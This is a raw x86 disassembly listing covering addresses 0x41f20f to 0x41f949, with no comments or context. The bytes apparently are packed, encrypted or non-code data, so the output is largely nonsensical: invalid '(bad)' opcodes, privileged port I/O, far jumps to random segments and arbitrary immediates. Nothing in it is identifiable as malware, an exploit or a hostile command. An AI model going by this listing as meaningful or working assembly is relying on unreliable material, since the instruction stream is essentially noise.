  41f20f:	(bad)  
  41f210:	jg     0x41f27a
  41f212:	add    dl,bh
  41f214:	xchg   edx,eax
  41f215:	adc    BYTE PTR [ebp+0x20],cl
  41f218:	out    0xc1,eax
  41f21a:	inc    ecx
  41f21b:	dec    ebp
  41f21c:	xor    BYTE PTR [ebx-0x43],dh
  41f21f:	jge    0x41f250
  41f221:	xor    eax,0x6fa86d21
  41f226:	sbb    al,0xba
  41f228:	sti    
  41f229:	push   ds
  41f22a:	loopne 0x41f22b
  41f22c:	xor    DWORD PTR [esi],ebx
  41f22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f22f:	xor    BYTE PTR [ebp+0x43],dh
  41f232:	in     al,0x6b
  41f234:	inc    ebx
  41f235:	in     eax,dx
  41f236:	push   edx
  41f237:	js     0x41f244
  41f239:	(bad)  
  41f23a:	fild   WORD PTR [esi-0x3e08ded9]
  41f240:	xchg   edi,eax
  41f241:	mov    ebp,0x49616e65
  41f246:	xchg   ebx,eax
  41f247:	rcr    DWORD PTR [edi+esi*8-0x5b],cl
  41f24b:	jmp    0x41f1f3
  41f24d:	xor    DWORD PTR [edx-0x1c],eax
  41f250:	fs test al,0x6b
  41f253:	hlt    
  41f254:	mov    dl,0x71
  41f256:	jmp    0xef22:0x7b580558
  41f25d:	sahf   
  41f25e:	pusha  
  41f25f:	dec    edi
  41f260:	in     al,dx
  41f261:	mov    edx,DWORD PTR [eax+0x10]
  41f264:	push   edx
  41f265:	sbb    al,dl
  41f267:	nop
  41f268:	inc    ebx
  41f269:	retw   0x7f4b
  41f26d:	fucomp st(4)
  41f26f:	cs xchg ecx,eax
  41f271:	pop    esp
  41f272:	in     al,0xf0
  41f274:	mov    ebp,0x676d7977
  41f279:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41f27b:	gs xchg esi,eax
  41f27d:	out    0x3d,eax
  41f27f:	leave  
  41f280:	inc    edi
  41f281:	(bad)  
  41f282:	aad    0xb6
  41f284:	dec    ebp
  41f285:	cwde   
  41f286:	in     eax,dx
  41f287:	push   ss
  41f288:	mov    esp,0xa4f8cf30
  41f28d:	jo     0x41f2bc
  41f28f:	mov    cl,0x40
  41f291:	mov    ds:0xb3a418c6,al
  41f296:	outs   dx,DWORD PTR ds:[esi]
  41f297:	dec    ebx
  41f298:	nop
  41f299:	dec    ebx
  41f29a:	sub    ax,0x6b3c
  41f29e:	sbb    al,0x5f
  41f2a0:	sbb    DWORD PTR [esi-0x53831a3],ebx
  41f2a6:	ret    
  41f2a7:	mov    ah,0x2
  41f2a9:	es int3 
  41f2ab:	pop    es
  41f2ac:	rol    BYTE PTR [ebx],cl
  41f2ae:	adc    BYTE PTR [esi],ch
  41f2b0:	cld    
  41f2b1:	dec    ebx
  41f2b2:	pop    esp
  41f2b3:	xor    edi,DWORD PTR ds:0xa5d9b726
  41f2b9:	bound  edx,QWORD PTR [edi]
  41f2bb:	adc    al,0xbc
  41f2bd:	sbb    edi,DWORD PTR [edx]
  41f2bf:	pop    eax
  41f2c0:	cmp    BYTE PTR [eax-0x3651a596],cl
  41f2c6:	stos   BYTE PTR es:[edi],al
  41f2c7:	cmp    al,0xd6
  41f2c9:	mov    eax,0xbf6f4304
  41f2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2cf:	pop    es
  41f2d0:	push   0x1694608b
  41f2d5:	out    0xe7,eax
  41f2d7:	mov    BYTE PTR [ebx],ch
  41f2d9:	xchg   esp,eax
  41f2da:	pop    esi
  41f2db:	or     DWORD PTR [eax-0x75b1d3f8],esi
  41f2e1:	pop    eax
  41f2e2:	(bad)  
  41f2e3:	(bad)  
  41f2e4:	push   ds
  41f2e5:	push   cs
  41f2e6:	cld    
  41f2e7:	out    dx,al
  41f2e8:	shl    BYTE PTR [edx+0x63],cl
  41f2eb:	push   ecx
  41f2ec:	iret   
  41f2ed:	or     ebp,DWORD PTR [ebx]
  41f2ef:	imul   edx,DWORD PTR [ebx],0x23
  41f2f2:	aam    0x7e
  41f2f4:	pop    ss
  41f2f5:	test   eax,0xb90605fb
  41f2fa:	fs pop ss
  41f2fc:	sbb    al,0x30
  41f2fe:	mov    bl,0xe6
  41f300:	imul   edx,DWORD PTR [esi-0x78b0ee6f],0x17
  41f307:	stc    
  41f308:	imul   eax,edi,0x11
  41f30b:	xor    eax,0x7c364ca2
  41f310:	mov    edx,0xeed61fd0
  41f315:	mov    dh,0x65
  41f317:	or     al,0x82
  41f319:	sar    BYTE PTR [esi+0x1da1],cl
  41f31f:	add    BYTE PTR [eax],al
  41f321:	add    BYTE PTR [ebx],ch
  41f323:	mov    eax,ds:0xf6cb1443
  41f328:	jg     0x41f2e9
  41f32a:	test   ch,ch
  41f32c:	out    dx,al
  41f32d:	sbb    BYTE PTR [ecx],0x67
  41f330:	ja     0x41f2cb
  41f332:	out    0x6d,al
  41f334:	add    DWORD PTR [eax],eax
  41f336:	repz add al,0x0
  41f339:	add    BYTE PTR ds:0x9b3b3877,dl
  41f33f:	int    0x64
  41f341:	imul   ebx,DWORD PTR [esi],0xd5266227
  41f347:	jns    0x41f2fe
  41f349:	inc    edx
  41f34a:	push   eax
  41f34b:	les    edx,FWORD PTR [eax+0x7e]
  41f34e:	dec    edx
  41f34f:	in     al,dx
  41f350:	std    
  41f351:	das    
  41f352:	jmp    0x41f364
  41f354:	push   es
  41f355:	pop    ebx
  41f356:	xchg   ebx,eax
  41f357:	lods   eax,DWORD PTR ds:[esi]
  41f358:	ror    DWORD PTR [eax-0x70bd74f8],1
  41f35e:	(bad)  
  41f35f:	mov    edx,0xdfb82bec
  41f364:	js     0x41f369
  41f366:	jecxz  0x41f31c
  41f368:	xchg   BYTE PTR [eax+edi*2-0x30],ah
  41f36c:	(bad)  
  41f36d:	(bad)  
  41f36e:	into   
  41f36f:	aas    
  41f370:	mov    eax,ds:0xaca9b613
  41f375:	and    eax,0x9e17b353
  41f37a:	retf   
  41f37b:	pop    eax
  41f37c:	adc    DWORD PTR [ecx],0xffffffc1
  41f37f:	or     DWORD PTR [esi],esp
  41f381:	stos   DWORD PTR es:[edi],eax
  41f382:	jns    0x41f3d1
  41f384:	or     eax,0x89259c39
  41f389:	outs   dx,DWORD PTR ds:[esi]
  41f38a:	adc    DWORD PTR [ecx+ebx*4+0xd],esi
  41f38e:	out    0x47,eax
  41f390:	cmp    eax,0x8fde054c
  41f395:	or     al,0x63
  41f397:	ja     0x41f37e
  41f399:	pusha  
  41f39a:	xor    esp,DWORD PTR [edx+ecx*8+0x2b149ad1]
  41f3a1:	add    esp,DWORD PTR [ecx]
  41f3a3:	(bad)  
  41f3a4:	mov    dl,0x14
  41f3a6:	jno    0x41f412
  41f3a8:	popf   
  41f3a9:	adc    DWORD PTR [edi-0x5dfcfe56],edx
  41f3af:	adc    BYTE PTR ds:0x63790fa5,dl
  41f3b5:	rcl    BYTE PTR [ebp+0x4147f55a],0x7
  41f3bc:	fisttp QWORD PTR [eax]
  41f3be:	pop    ds
  41f3bf:	loopne 0x41f3c2
  41f3c1:	nop
  41f3c2:	mov    dh,0x8e
  41f3c4:	int3   
  41f3c5:	call   0xb319ace1
  41f3ca:	cdq    
  41f3cb:	add    ebx,edx
  41f3cd:	add    eax,DWORD PTR [esp+ebx*1+0x3d]
  41f3d1:	push   ebx
  41f3d2:	inc    ebx
  41f3d3:	adc    eax,0x558c975f
  41f3d8:	jns    0x41f3cc
  41f3da:	pop    edx
  41f3db:	inc    esi
  41f3dc:	mov    ds:0xbebc50e7,eax
  41f3e1:	pushf  
  41f3e2:	add    al,0x68
  41f3e4:	in     eax,0xc3
  41f3e6:	add    al,0x67
  41f3e8:	mov    dl,0x6f
  41f3ea:	loopne 0x41f3da
  41f3ec:	outs   dx,BYTE PTR ds:[esi]
  41f3ed:	sub    ah,BYTE PTR [esi]
  41f3ef:	xor    eax,0xd9449694
  41f3f4:	inc    edx
  41f3f5:	(bad)  
  41f3f6:	pop    edx
  41f3f7:	pop    ebx
  41f3f8:	mov    ds:0x92437b4f,eax
  41f3fd:	push   ebp
  41f3fe:	pop    eax
  41f3ff:	pop    ds
  41f400:	mov    esi,0x14ff5632
  41f405:	imul   edx,DWORD PTR [edx],0x39
  41f408:	(bad)  
  41f409:	push   edi
  41f40a:	and    eax,0xcb289ae6
  41f40f:	pop    esp
  41f410:	sub    esi,esp
  41f412:	dec    esp
  41f413:	ret    0x7e69
  41f416:	in     eax,dx
  41f417:	or     BYTE PTR [edi],bh
  41f419:	imul   esp,DWORD PTR [edx-0x59411217],0xf7e806d7
  41f423:	push   es
  41f424:	adc    BYTE PTR [edx-0x15],al
  41f427:	call   0xe07d0b8
  41f42c:	push   es
  41f42d:	cmc    
  41f42e:	xchg   esi,eax
  41f42f:	mov    ?,WORD PTR [esi-0x2da45db7]
  41f435:	(bad)  
  41f436:	js     0x41f3e2
  41f438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f439:	rcr    DWORD PTR [eax-0x61],1
  41f43c:	add    DWORD PTR [esi+0x10ed400a],ebp
  41f442:	mov    esi,0xf790cc6c
  41f447:	or     eax,0x172dcf08
  41f44c:	jnp    0x41f4b2
  41f44e:	cld    
  41f44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f450:	pop    esi
  41f451:	fstp   QWORD PTR [esi-0x25]
  41f454:	sahf   
  41f455:	or     DWORD PTR [ebx-0x2f9dfb02],ebp
  41f45b:	mov    ebx,0xb7761221
  41f460:	mov    esi,cs
  41f462:	add    al,0x9c
  41f464:	ja     0x41f4e5
  41f466:	popf   
  41f467:	lods   al,BYTE PTR ds:[esi]
  41f468:	inc    ebp
  41f469:	sbb    BYTE PTR fs:[eax+edx*1-0x2e],ch
  41f46e:	inc    eax
  41f46f:	mov    ebx,0xd9287e76
  41f474:	inc    ecx
  41f475:	inc    esp
  41f476:	sbb    BYTE PTR [edx-0x642eeaee],bh
  41f47c:	popa   
  41f47d:	leave  
  41f47e:	js     0x41f481
  41f480:	mov    bl,0xb
  41f482:	leave  
  41f483:	xchg   ebp,ebp
  41f485:	outs   dx,DWORD PTR ds:[esi]
  41f486:	jg     0x41f419
  41f488:	fisub  DWORD PTR [esi-0xccfa397]
  41f48e:	lock mov dl,0xe1
  41f491:	fnstenv [edi]
  41f493:	push   edi
  41f494:	mov    esi,DWORD PTR [ecx-0x36]
  41f497:	and    BYTE PTR [esi],0x22
  41f49a:	push   0x790cf6dc
  41f49f:	xchg   esp,eax
  41f4a0:	cmp    esp,DWORD PTR [ebx+eiz*1]
  41f4a3:	add    eax,0xa09d6df
  41f4a8:	outs   dx,DWORD PTR ds:[esi]
  41f4a9:	mov    edi,0xf2fc0154
  41f4ae:	push   0x7069b344
  41f4b3:	das    
  41f4b4:	icebp  
  41f4b5:	jno    0x41f4ac
  41f4b7:	loopne 0x41f501
  41f4b9:	xor    DWORD PTR [edx+0x2a],esp
  41f4bc:	mov    al,0xca
  41f4be:	mov    ebp,?
  41f4c0:	pop    edi
  41f4c1:	loop   0x41f4a0
  41f4c3:	arpl   bp,di
  41f4c5:	adc    DWORD PTR [ebp-0x4c],0x2403454b
  41f4cc:	xor    edx,esp
  41f4ce:	jmp    0xac2d:0x302f2c73
  41f4d5:	sub    edi,eax
  41f4d7:	sbb    esi,DWORD PTR [edi]
  41f4d9:	xor    DWORD PTR [ebx+edx*1],esi
  41f4dc:	mov    dl,0x3c
  41f4de:	fcmovb st,st(6)
  41f4e0:	test   BYTE PTR [edi-0x16dd37aa],0xd0
  41f4e7:	enter  0x43e0,0x9
  41f4eb:	int    0x60
  41f4ed:	mov    al,ds:0xb646b294
  41f4f2:	push   edx
  41f4f3:	xor    esp,DWORD PTR [eax+0x1be1e7c3]
  41f4f9:	stc    
  41f4fa:	ja     0x41f510
  41f4fc:	aad    0xdd
  41f4fe:	ja     0x41f554
  41f500:	push   es
  41f501:	ins    BYTE PTR es:[edi],dx
  41f502:	and    eax,esp
  41f504:	push   edx
  41f505:	or     al,0xf6
  41f507:	scas   al,BYTE PTR es:[edi]
  41f508:	mov    DWORD PTR [eax+0x6b5d37f9],esi
  41f50e:	or     eax,0xd7934ae6
  41f513:	fldenv [ecx]
  41f515:	into   
  41f516:	lea    esp,[eax+0x38]
  41f519:	dec    ebx
  41f51a:	pushf  
  41f51b:	cmp    ebp,esi
  41f51d:	pop    eax
  41f51e:	rcr    DWORD PTR [esi-0x4ca4679c],0x9a
  41f525:	les    edx,FWORD PTR [eax]
  41f527:	or     BYTE PTR [ecx],ah
  41f529:	jmp    0xd329:0x28fb706c
  41f530:	fnstsw WORD PTR [edx+0x5]
  41f533:	aam    0x4c
  41f535:	cs data16 jmp 0x41f55b
  41f539:	jae    0x41f4e3
  41f53b:	adc    bl,ah
  41f53d:	sbb    ebx,DWORD PTR [edi-0x535e7fd]
  41f543:	ds dec esi
  41f545:	retf   
  41f546:	call   ebp
  41f548:	aam    0x18
  41f54a:	int    0x9
  41f54c:	add    DWORD PTR [ecx-0x2ce85bd7],edi
  41f552:	fdiv   QWORD PTR [edi-0x4e]
  41f555:	xor    dl,BYTE PTR [esi]
  41f557:	rcl    BYTE PTR [ebx+0x10],cl
  41f55a:	adc    al,0x7b
  41f55c:	adc    eax,0xa63568a6
  41f561:	jns    0x41f4fa
  41f563:	push   0xb4c5890b
  41f568:	add    ebp,ebx
  41f56a:	ret    
  41f56b:	or     bh,BYTE PTR [edi+0x6a68e735]
  41f571:	jecxz  0x41f515
  41f573:	pop    ss
  41f574:	call   0x5729:0xc1fd89a1
  41f57b:	cwde   
  41f57c:	iret   
  41f57d:	push   ds
  41f57e:	push   esi
  41f57f:	lds    ebx,FWORD PTR [edi]
  41f581:	inc    eax
  41f582:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41f584:	loopne 0x41f55b
  41f586:	pushf  
  41f587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f588:	aas    
  41f589:	lock ja 0x41f580
  41f58c:	repnz mov eax,0x42f6a9ae
  41f592:	or     esi,DWORD PTR [esi+0x12]
  41f595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f596:	mov    cl,0xc1
  41f598:	push   ebp
  41f599:	or     esp,ebx
  41f59b:	fldcw  WORD PTR [ebx]
  41f59d:	xchg   edi,eax
  41f59e:	dec    esp
  41f59f:	cwde   
  41f5a0:	jmp    0x41f5e2
  41f5a2:	cld    
  41f5a3:	ins    DWORD PTR es:[edi],dx
  41f5a4:	mov    dl,0xb8
  41f5a6:	sub    DWORD PTR [esi-0x1d],ecx
  41f5a9:	sti    
  41f5aa:	jnp    0x41f5a4
  41f5ac:	int3   
  41f5ad:	add    eax,0xefe7a8fc
  41f5b2:	inc    esi
  41f5b3:	je     0x41f58a
  41f5b5:	xlat   BYTE PTR ds:[ebx]
  41f5b6:	iret   
  41f5b7:	adc    DWORD PTR ds:0xe467072f,0xffffffbe
  41f5be:	clc    
  41f5bf:	jo     0x41f563
  41f5c1:	push   esp
  41f5c2:	xchg   edx,eax
  41f5c3:	into   
  41f5c4:	sub    eax,0xb88d8618
  41f5c9:	stc    
  41f5ca:	push   eax
  41f5cb:	mul    DWORD PTR [edx]
  41f5cd:	sbb    DWORD PTR [ebx-0x2d183c38],0xae86f98d
  41f5d7:	loopne 0x41f5f7
  41f5d9:	dec    ebx
  41f5da:	sub    eax,0x803790f6
  41f5df:	in     al,0x61
  41f5e1:	hlt    
  41f5e2:	shr    DWORD PTR [eax-0x7e9ef8fa],1
  41f5e8:	jmp    0xbdec1558
  41f5ed:	popa   
  41f5ee:	push   ecx
  41f5ef:	cmp    esi,DWORD PTR [ecx]
  41f5f1:	pop    eax
  41f5f2:	in     eax,0xf2
  41f5f4:	les    ebp,FWORD PTR [ebp-0x6e]
  41f5f7:	sbb    DWORD PTR [esp+ecx*4],ebp
  41f5fa:	bound  esp,QWORD PTR [edi+ecx*8]
  41f5fd:	gs (bad) 
  41f5ff:	mov    al,ds:0x280a93d8
  41f604:	adc    ah,BYTE PTR [ecx+0x76]
  41f607:	sti    
  41f608:	pop    ebp
  41f609:	adc    eax,0x304abb97
  41f60e:	ret    0xc712
  41f611:	mov    dl,0xad
  41f613:	lea    edi,cs:[edx+ebx*1]
  41f617:	xchg   ebp,eax
  41f618:	sar    DWORD PTR ds:[esi+0x6f],cl
  41f61c:	aad    0x56
  41f61e:	add    al,0xd5
  41f620:	lahf   
  41f621:	data16 and dh,BYTE PTR ss:[eax+0x0]
  41f626:	clc    
  41f627:	mov    ah,0xae
  41f629:	mov    al,BYTE PTR [ecx]
  41f62b:	inc    ebx
  41f62c:	jns    0x41f694
  41f62e:	add    eax,0x58280f0c
  41f633:	mov    eax,0x657db06d
  41f638:	mov    DWORD PTR [edx+eax*2],ebx
  41f63b:	xor    ah,ah
  41f63d:	xchg   edi,eax
  41f63e:	push   0xffffffbb
  41f640:	mov    ds:0xaa3ee36e,eax
  41f645:	popa   
  41f646:	push   0x40955ccb
  41f64b:	jae    0x41f66f
  41f64d:	ss adc al,0xdc
  41f650:	lds    edx,FWORD PTR [eax-0x1f6caf8f]
  41f656:	in     eax,0x2b
  41f658:	push   edx
  41f659:	cmp    al,0xeb
  41f65b:	sub    al,0x59
  41f65d:	lds    esp,FWORD PTR [ecx]
  41f65f:	(bad)  
  41f660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f661:	xor    DWORD PTR [esp+ecx*8],esp
  41f664:	cmp    esi,DWORD PTR [edi-0xbd9fb04]
  41f66a:	(bad)  
  41f66b:	in     al,0x1a
  41f66d:	cmc    
  41f66e:	add    ebp,0x72
  41f671:	loope  0x41f64d
  41f673:	rcr    DWORD PTR [edi],0xcf
  41f676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f677:	push   cs
  41f678:	and    DWORD PTR [ecx-0x3c],ecx
  41f67b:	mov    ebp,0xaa5e876e
  41f680:	push   es
  41f681:	cwde   
  41f682:	dec    ebp
  41f683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f684:	xchg   edi,eax
  41f685:	(bad)  
  41f686:	das    
  41f687:	popa   
  41f688:	inc    ecx
  41f689:	in     eax,dx
  41f68a:	mov    al,BYTE PTR ds:0x45d72ab8
  41f690:	or     ebp,edi
  41f692:	or     al,0xe4
  41f694:	mov    DWORD PTR [eax],ebx
  41f696:	test   BYTE PTR [edx+0x7e],cl
  41f699:	mov    esi,0xd9300bc2
  41f69e:	mov    ds:0xe471be62,eax
  41f6a3:	mov    dh,0x77
  41f6a5:	mov    ebp,DWORD PTR [esp+esi*1]
  41f6a8:	aaa    
  41f6a9:	push   cs
  41f6aa:	jne    0x41f6ab
  41f6ac:	call   0x2f71a59b
  41f6b1:	lock lods eax,DWORD PTR ds:[esi]
  41f6b3:	popa   
  41f6b4:	cdq    
  41f6b5:	dec    ecx
  41f6b6:	xchg   BYTE PTR [edi-0x68f95189],ah
  41f6bc:	push   ebx
  41f6bd:	xor    bl,BYTE PTR [ebp-0x40]
  41f6c0:	cvtps2pi mm5,QWORD PTR [edx]
  41f6c3:	out    dx,eax
  41f6c4:	pop    ds
  41f6c5:	les    esi,FWORD PTR [eax+eax*8+0x6f5a0bb2]
  41f6cc:	nop
  41f6cd:	xchg   BYTE PTR [ecx],dh
  41f6cf:	lds    ecx,FWORD PTR [ecx]
  41f6d1:	jno    0x41f69a
  41f6d3:	fst    DWORD PTR [ebp+eax*1+0x6d]
  41f6d7:	lods   eax,DWORD PTR ds:[esi]
  41f6d8:	ins    DWORD PTR es:[edi],dx
  41f6d9:	mov    WORD PTR [edi],ss
  41f6db:	jl     0x41f6eb
  41f6dd:	(bad)
  41f6e0:	xor    al,0xd1
  41f6e2:	repnz jmp 0xa416:0x4bda37ad
  41f6ea:	pop    ebp
  41f6eb:	lock out dx,al
  41f6ed:	push   cs
  41f6ee:	pop    ds
  41f6ef:	in     eax,0x28
  41f6f1:	aaa    
  41f6f2:	retf   0xdb30
  41f6f5:	jl     0x41f724
  41f6f7:	push   esi
  41f6f8:	inc    esi
  41f6f9:	addr16 dec esp
  41f6fb:	ds jo  0x41f757
  41f6fe:	aad    0x42
  41f700:	pop    es
  41f701:	push   esp
  41f702:	(bad)  
  41f703:	data16 jb 0x41f6ad
  41f706:	jle    0x41f6bf
  41f708:	dec    esi
  41f709:	lahf   
  41f70a:	shl    DWORD PTR [eax+0x21],cl
  41f70d:	and    ebp,ebx
  41f70f:	push   ebx
  41f710:	xchg   edx,eax
  41f711:	or     BYTE PTR [esi-0x6ea182e4],0xd7
  41f718:	out    dx,al
  41f719:	inc    ecx
  41f71a:	repz sbb ecx,ebx
  41f71d:	sbb    eax,0xc131084e
  41f722:	pusha  
  41f723:	xchg   edx,eax
  41f724:	sbb    eax,DWORD PTR [edi]
  41f726:	stos   BYTE PTR es:[edi],al
  41f727:	mov    edx,?
  41f729:	jmp    0x41f769
  41f72b:	xchg   esi,eax
  41f72c:	into   
  41f72d:	push   edi
  41f72e:	mov    ah,0x3d
  41f730:	xor    al,0xd3
  41f732:	imul   esi,DWORD PTR [edx],0x15
  41f735:	into   
  41f736:	cmp    DWORD PTR [edi],ebx
  41f738:	(bad)  
  41f739:	in     eax,dx
  41f73a:	dec    eax
  41f73b:	fst    DWORD PTR [eax-0x47]
  41f73e:	not    DWORD PTR [edx-0x5f]
  41f741:	imul   edi,DWORD PTR [ecx],0xffffff8b
  41f744:	or     ebp,ebx
  41f746:	call   0xaeab:0xe1f00255
  41f74d:	inc    eax
  41f74e:	and    DWORD PTR [esi-0x51e755a6],edx
  41f754:	jnp    0x41f70a
  41f756:	mov    al,0xd2
  41f758:	mov    ds:0x57f67310,al
  41f75d:	push   ebp
  41f75e:	call   FWORD PTR [ecx-0x3ccc2e09]
  41f764:	jle    0x41f7ca
  41f766:	jmp    0x61645918
  41f76b:	mov    dh,0xef
  41f76d:	mov    ds:0x5a5c72de,al
  41f772:	loope  0x41f758
  41f774:	repz jp 0x41f79c
  41f777:	daa    
  41f778:	into   
  41f779:	or     ah,BYTE PTR [ebx+0x14eebcf7]
  41f77f:	es stos DWORD PTR es:[edi],eax
  41f781:	stos   DWORD PTR es:[edi],eax
  41f782:	out    0x57,al
  41f784:	cmp    bl,BYTE PTR [edx+eax*1]
  41f787:	aad    0xfd
  41f789:	add    al,0x47
  41f78b:	out    0xfc,al
  41f78d:	pushf  
  41f78e:	repz in eax,dx
  41f790:	(bad)  
  41f791:	sti    
  41f792:	or     eax,0xe3140abf
  41f797:	adc    al,0x7f
  41f799:	stos   BYTE PTR es:[edi],al
  41f79a:	mov    ds:0x9b8d0f89,al
  41f79f:	add    eax,0xb7094812
  41f7a4:	pop    eax
  41f7a5:	outs   dx,BYTE PTR ds:[esi]
  41f7a6:	call   0x2efb:0xea4e1fed
  41f7ad:	shl    BYTE PTR [edi-0x6a],1
  41f7b0:	scas   eax,DWORD PTR es:[edi]
  41f7b1:	xor    cl,bh
  41f7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7b4:	sbb    ah,BYTE PTR [ebp-0x68b52020]
  41f7ba:	and    eax,0x42cc1210
  41f7bf:	js     0x41f834
  41f7c1:	clc    
  41f7c2:	pop    ebp
  41f7c3:	jo     0x41f7af
  41f7c5:	pushf  
  41f7c6:	mov    ecx,0x8e0d334f
  41f7cb:	jno    0x41f795
  41f7cd:	add    DWORD PTR [esi-0x1d],esi
  41f7d0:	rcr    DWORD PTR [eax],0x17
  41f7d3:	inc    edx
  41f7d4:	mov    DWORD PTR [esi],ebp
  41f7d6:	test   eax,0xe7be75d1
  41f7db:	xor    eax,0x771e4320
  41f7e0:	add    al,0x65
  41f7e2:	fcomip st,st(2)
  41f7e4:	in     al,dx
  41f7e5:	push   ss
  41f7e6:	dec    eax
  41f7e7:	xchg   di,ax
  41f7e9:	add    bh,BYTE PTR [ebx+eiz*8+0x23]
  41f7ed:	or     al,0xb6
  41f7ef:	jmp    0x2095aecf
  41f7f4:	jb     0x41f874
  41f7f6:	(bad)  
  41f7f7:	shl    DWORD PTR [edi-0x7a344dba],cl
  41f7fd:	jno    0x41f85c
  41f7ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f800:	lahf   
  41f801:	cmp    al,0x91
  41f803:	stos   BYTE PTR es:[edi],al
  41f804:	cs clc 
  41f806:	(bad)  
  41f807:	rcl    DWORD PTR [eax],cl
  41f809:	pop    ebp
  41f80a:	jae    0x41f7cc
  41f80c:	pop    edi
  41f80d:	or     DWORD PTR [eax+0x6b282256],edx
  41f813:	ret    0x5dee
  41f816:	pusha  
  41f817:	mov    cl,0x1a
  41f819:	adc    ah,dh
  41f81b:	mov    al,ss:0x643a01be
  41f821:	(bad)  
  41f822:	leave  
  41f823:	and    DWORD PTR [ebx+0x58],ebx
  41f826:	mov    ebx,0xd4b6b967
  41f82b:	ret    0x9b
  41f82e:	add    BYTE PTR [eax],al
  41f830:	add    BYTE PTR [eax],al
  41f832:	dec    eax
  41f833:	mul    BYTE PTR fs:[eax-0x2]
  41f837:	repnz fisubr WORD PTR [ecx+eiz*8-0x64]
  41f83c:	out    0x52,eax
  41f83e:	sub    ax,0x873d
  41f842:	fnstenv [edx+0x1]
  41f845:	add    bl,dh
  41f847:	add    al,0x0
  41f849:	add    BYTE PTR [edi+0x5ed2d20e],bl
  41f84f:	pop    ss
  41f850:	sub    ecx,ebx
  41f852:	test   BYTE PTR [edi+edx*8],0x4b
  41f856:	push   esi
  41f857:	xchg   esp,eax
  41f858:	and    eax,DWORD PTR [eax]
  41f85a:	lods   al,BYTE PTR ds:[esi]
  41f85b:	shr    DWORD PTR [esi+eax*8-0x1d],1
  41f85f:	jg     0x41f8d8
  41f861:	mov    ah,bh
  41f863:	sbb    al,0xf0
  41f865:	and    edi,ecx
  41f867:	dec    esi
  41f868:	pop    eax
  41f869:	xor    esi,DWORD PTR [esi+0x3f]
  41f86c:	test   eax,0x5408ba98
  41f871:	mov    cl,0x41
  41f873:	nop
  41f874:	jne    0x41f8b9
  41f876:	mov    cl,0xdc
  41f878:	popa   
  41f879:	mov    dl,0xae
  41f87b:	jl     0x41f8e7
  41f87d:	sbb    al,0x12
  41f87f:	xchg   ebx,eax
  41f880:	pop    eax
  41f881:	sahf   
  41f882:	loopne 0x41f80f
  41f884:	icebp  
  41f885:	mov    bl,0xe5
  41f887:	in     al,dx
  41f888:	dec    eax
  41f889:	sbb    edi,DWORD PTR [ebp-0x73]
  41f88c:	mov    DWORD PTR [edx+0x5b1591d],esp
  41f892:	add    esi,DWORD PTR [ebp+0x4a]
  41f895:	jno    0x41f89b
  41f897:	std    
  41f898:	push   edx
  41f899:	(bad)  [edi+0x22]
  41f89c:	leave  
  41f89d:	mov    eax,DWORD PTR [eax-0x77]
  41f8a0:	and    al,0xed
  41f8a2:	mov    cl,cl
  41f8a4:	test   BYTE PTR [ebp-0x5b],ah
  41f8a7:	je     0x41f920
  41f8a9:	js     0x41f87c
  41f8ab:	pop    esp
  41f8ac:	add    BYTE PTR [eax+0x3f],ch
  41f8af:	xor    DWORD PTR [esp+eax*4-0x4],esi
  41f8b3:	pop    esp
  41f8b4:	aam    0xf8
  41f8b6:	sti    
  41f8b7:	pop    es
  41f8b8:	and    ebp,esp
  41f8ba:	shl    BYTE PTR ds:0x947f6baa,cl
  41f8c0:	pop    esi
  41f8c1:	mov    ch,0x49
  41f8c3:	cmp    eax,0xc539c583
  41f8c8:	add    DWORD PTR [eax],0x246b5b54
  41f8ce:	rcl    BYTE PTR [ecx-0x3e38b621],1
  41f8d4:	stos   DWORD PTR es:[edi],eax
  41f8d5:	call   0x9f7284ae
  41f8da:	icebp  
  41f8db:	jno    0x41f950
  41f8dd:	addr16 icebp 
  41f8df:	retf   0xc814
  41f8e2:	add    DWORD PTR [ebx+0x34],edi
  41f8e5:	mov    ?,edi
  41f8e7:	in     al,0x7a
  41f8e9:	addr16 (bad) 
  41f8eb:	sar    BYTE PTR [esp+esi*2-0x31],cl
  41f8ef:	icebp  
  41f8f0:	pop    edx
  41f8f1:	jbe    0x41f87f
  41f8f3:	(bad)  
  41f8f4:	sti    
  41f8f5:	outs   dx,DWORD PTR ds:[esi]
  41f8f6:	mov    DWORD PTR fs:0x33cef527,edx
  41f8fd:	inc    ecx
  41f8fe:	das    
  41f8ff:	sbb    BYTE PTR [edi],al
  41f901:	pop    edx
  41f902:	popf   
  41f903:	fsub   QWORD PTR [edx+0x27]
  41f906:	cmc    
  41f907:	xor    DWORD PTR [eax-0x61],eax
  41f90a:	add    ebp,esp
  41f90c:	dec    ecx
  41f90d:	jnp    0x41f91a
  41f90f:	pop    eax
  41f910:	xchg   edi,eax
  41f911:	pop    edx
  41f912:	dec    edi
  41f913:	aad    0x17
  41f915:	data16 jecxz 0x41f918
  41f918:	mov    edx,0x198ccc71
  41f91d:	or     al,cl
  41f91f:	inc    edx
  41f920:	hlt    
  41f921:	fwait
  41f922:	cmp    esi,DWORD PTR [esp+ebx*1]
  41f925:	adc    eax,0xe93c82da
  41f92a:	xchg   DWORD PTR [ebp-0xa172fcb],edi
  41f930:	das    
  41f931:	jmp    0x41f9a1
  41f933:	out    dx,al
  41f934:	mov    edx,0x551f9f9d
  41f939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f93b:	iret   
  41f93c:	out    0xbf,eax
  41f93e:	dec    eax
  41f93f:	(bad)  
  41f940:	pusha  
  41f941:	and    esi,ebx
  41f943:	js     0x41f930
  41f945:	mov    dh,0x87
  41f947:	sub    ebp,ebx
  41f949:	scas   al,BYTE PTR es:[edi]
